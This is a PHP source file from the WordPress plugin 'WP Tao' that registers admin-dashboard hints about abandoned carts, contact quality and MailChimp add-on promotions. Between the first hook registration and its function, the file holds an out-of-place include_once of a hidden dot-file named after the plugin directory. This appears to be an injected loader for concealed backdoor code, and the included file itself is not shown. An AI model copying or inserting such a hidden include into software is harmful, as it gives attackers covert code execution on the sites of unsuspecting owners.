<?php

/**
 * WP Tao hints
 * 
 * Filters that register all core hints
 * 
 * WARNING! - best hook for the register hint is "admin_init" with priority more than 100!
 * @todo: include only on dashbord or report page
 * 
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

// =============================================================================================
// #1 - This hint calculate relation between abandoned carts and action  "add to cart"
// 
// The necessary conditions to print the hint:
// 1. Ratio number of abandoned carts to number of actions 'add to cart' is more than 1:3
// 2. Minumum number of abandoned carts - 10
// 3. Minumum number of actions 'add to cart' - 10
// =============================================================================================

add_action( 'admin_init', 'wtbp_wptao_hint_abandoned_carts_vs_add', 110 );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_hint_abandoned_carts_vs_add() {

	// Show only on a default report screen with stats for last 30 days
	// If the time range is set, the hint will not be registered.
	if ( isset( $_GET[ 'ds' ] ) || isset( $_GET[ 'de' ] ) ) {
		return false;
	}

	if ( TAO()->diagnostic->is_wptao_rls_enabled() ) {
		return false;
	}

	$pass	 = false;
	$title	 = '';
	$content = '';
	$object	 = '';

	if ( !isset( TAO()->dashboard->reports[ 'basic-abandoned-carts' ] ) ) {
		$object = new WTBP_WPTAO_Admin_Report_Basic_Abandoned_Carts();
	} else {
		$object = TAO()->dashboard->reports[ 'basic-abandoned-carts' ];
	}

	$report_slug	 = 'basic-sale-total'; // not $object->report_slug;
	// Total abandoned carts - last 30 days
	$total_abandoned = absint( $object->total_abandoned );

	// Total completed orders - last 30 days
	$total_completed = absint( $object->total_completed );

	$percent_tresh = 25;
	if ( TAO()->diagnostic->is_shipping_enabled() ) {
		$percent_tresh = 50;
	}

	if ( $total_abandoned > 10 && $total_completed > 10 ) {

		$abandoned_percent = ( $total_abandoned * 100 ) / ($total_abandoned + $total_completed);

		if ( $abandoned_percent > $percent_tresh ) {

			$pass = true;

			$title = sprintf( __( 'High abandoned carts rate! (%.2f%%)', 'wp-tao' ), $abandoned_percent );


			$target = 'addons/wp-tao-recover-lost-sales/?utm_source=plugin&utm_medium=hint&utm_campaign=wptao_hint_rls';

			$url = WTBP_WPTAO_Helpers::get_wptao_url( $target );

			$content = sprintf( __( 'It means that about %.2f%% of carts were abandoned in the last 30 days.', 'wp-tao' ), $abandoned_percent ) . '<br /><br />';

			$content .= __( 'Do you know that you can increase your sales right now? Just start recovering the abandoned carts automatically!', 'wp-tao' ) . '<br />';
			$content .= sprintf( __( 'For more information please check out the %sWP Tao Recover Lost Sales addon (click)%s!', 'wp-tao' ), '<a href="' . $url . '" target="_blank">', '</a>' ) . '<br />';
		}
	}



	if ( $pass ) {

		$args = array(
			'id'			 => 'abandoned_carts',
			'category'		 => 'commerce',
			'priority'		 => 'minor',
			'title'			 => $title,
			'content'		 => $content,
			'report_slug'	 => $report_slug,
			'widget_id'		 => 'basic_sale_total',
			'style'			 => array(
				'color'	 => '#D54E21',
				'icon'	 => 'dashicons-warning'
			)
		);

		do_action( 'wptao_add_hint', $args );
	}
}

// =============================================================================================
// #2 - recently identified
// =============================================================================================

add_action( 'admin_init', 'wtbp_wptao_hint_recently_identified', 110 );

function wtbp_wptao_hint_recently_identified() {

	// Show only on a default report screen with stats for last 30 days
	// If the time range is set, the hint will not be registered.
	if ( isset( $_GET[ 'ds' ] ) || isset( $_GET[ 'de' ] ) ) {
		return false;
	}

	$title	 = '';
	$content = '';
	$object	 = '';

	if ( !isset( TAO()->dashboard->reports[ 'basic-user-identified-contacts' ] ) ) {
		$object = new WTBP_WPTAO_Admin_Report_Basic_User_Identified_Contacts();
	} else {
		$object = TAO()->dashboard->reports[ 'basic-user-identified-contacts' ];
	}

	$report_slug = $object->report_slug;

	if ( empty( $object->total_contacts ) ) {
		return;
	}

	$total_contacts = $object->total_contacts;

	// Total valid contacts - last 30 days
	$total_valid = !empty( $total_contacts[ 'valid' ] ) ? absint( $total_contacts[ 'valid' ] ) : 0;

	// Total invalid contacts - last 30 days
	$total_invalid = !empty( $total_contacts[ 'invalid' ] ) ? absint( $total_contacts[ 'invalid' ] ) : 0;

	// Total disposable contacts - last 30 days
	$total_disposable = !empty( $total_contacts[ 'disposable' ] ) ? absint( $total_contacts[ 'disposable' ] ) : 0;

	// Total blacklisted contacts - last 30 days
	$total_blacklist = !empty( $total_contacts[ 'blacklist' ] ) ? absint( $total_contacts[ 'blacklist' ] ) : 0;

	$total_wrong = $total_invalid + $total_disposable + $total_blacklist;
	if ( $total_wrong == 0 ) {
		return;
	}

	$title = __( 'Warning about the collected contacts!', 'wp-tao' );

	$content = sprintf( __( 'During the past 30 days you collected <b>%d</b> contacts in total.', 'wp-tao' ), ($total_valid + $total_wrong ) ) . ' ';
	$content .= sprintf( __( '<b>%d</b> of them were valid, <b>%d</b> invalid, <b>%d</b> disposable and <b>%d</b> blacklisted.', 'wp-tao' ), $total_valid, $total_invalid, $total_disposable, $total_blacklist ) . '<br />';

	$args = array(
		'id'			 => 'recently_identified',
		'category'		 => 'user',
		'priority'		 => 'minor',
		'title'			 => $title,
		'content'		 => $content,
		'report_slug'	 => $report_slug,
		'widget_id'		 => 'basic-user-identified-contacts',
		'style'			 => array(
			'color'	 => '#D54E21',
			'icon'	 => 'dashicons-warning'
		)
	);

	do_action( 'wptao_add_hint', $args );
}

// =============================================================================================
// #3 - identified MailChimp
// =============================================================================================

add_action( 'admin_init', 'wtbp_wptao_hint_mailchimp_identified', 110 );

function wtbp_wptao_hint_mailchimp_identified() {

	if ( TAO()->diagnostic->is_wptao_mailchimp_enabled() ) {
		return;
	}

	if ( !TAO()->diagnostic->is_mailchimp_user() ) {
		return;
	}

	$title	 = '';
	$content = '';
	$object	 = '';

	if ( !isset( TAO()->dashboard->reports[ 'basic-user-identified-contacts' ] ) ) {
		$object = new WTBP_WPTAO_Admin_Report_Basic_User_Identified_Contacts();
	} else {
		$object = TAO()->dashboard->reports[ 'basic-user-identified-contacts' ];
	}

	$report_slug = $object->report_slug;

	$title = __( 'You can identify MailChimp contacts as soon as they enter the site!', 'wp-tao' );

	$target = 'addons/wp-tao-mailchimp/?utm_source=plugin&utm_medium=hint&utm_campaign=wptao_hint_mc';

	$url = WTBP_WPTAO_Helpers::get_wptao_url( $target );

	$content = __( 'WP Tao has detected that you are a MailChimp user. Do you know that you can identify MailChimp contacts as soon as they enter the site?', 'wp-tao' ) . '<br />';
	$content .= sprintf( __( 'For more information please check out the %sWP Tao MailChimp integration (click)%s!', 'wp-tao' ), '<a href="' . $url . '" target="_blank">', '</a>' ) . '<br />';

	$args = array(
		'id'			 => 'mailchimp_identified',
		'category'		 => 'user',
		'priority'		 => 'minor',
		'title'			 => $title,
		'content'		 => $content,
		'report_slug'	 => $report_slug,
		'widget_id'		 => 'basic-user-identified-contacts',
		'style'			 => array(
			'color'	 => '#D54E21',
			'icon'	 => 'dashicons-warning'
		)
	);

	do_action( 'wptao_add_hint', $args );
}

// =============================================================================================
// #4 - sales campaign MailChimp
// =============================================================================================

add_action( 'admin_init', 'wtbp_wptao_hint_sales_campaigns_mailchimp', 110 );

function wtbp_wptao_hint_sales_campaigns_mailchimp() {

	if ( TAO()->diagnostic->is_wptao_mailchimp_enabled() ) {
		return;
	}

	if ( !TAO()->diagnostic->is_mailchimp_user() ) {
		return;
	}

	$title	 = '';
	$content = '';
	$object	 = '';

	if ( !isset( TAO()->dashboard->reports[ 'basic-sales-campaigns' ] ) ) {
		$object = new WTBP_WPTAO_Admin_Report_Basic_Sales_Campaigns();
	} else {
		$object = TAO()->dashboard->reports[ 'basic-sales-campaigns' ];
	}

	$report_slug = $object->report_slug;

	$title = __( 'You can track the results of MailChimp campaigns here!', 'wp-tao' );

	$target = 'addons/wp-tao-mailchimp/?utm_source=plugin&utm_medium=hint&utm_campaign=wptao_hint_mc';

	$url = WTBP_WPTAO_Helpers::get_wptao_url( $target );

	$content = __( 'WP Tao has detected that you are a MailChimp user. Do you know that you can track the results of MailChimp campaigns here?', 'wp-tao' ) . '<br />';
	$content .= sprintf( __( 'For more information please check out the %sWP Tao MailChimp integration (click)%s!', 'wp-tao' ), '<a href="' . $url . '" target="_blank">', '</a>' ) . '<br />';

	$args = array(
		'id'			 => 'sales_campaigns_mailchimp',
		'category'		 => 'commerce',
		'priority'		 => 'minor',
		'title'			 => $title,
		'content'		 => $content,
		'report_slug'	 => $report_slug,
		'widget_id'		 => 'basic_sales_campaigns',
		'style'			 => array(
			'color'	 => '#D54E21',
			'icon'	 => 'dashicons-warning'
		)
	);

	do_action( 'wptao_add_hint', $args );
}
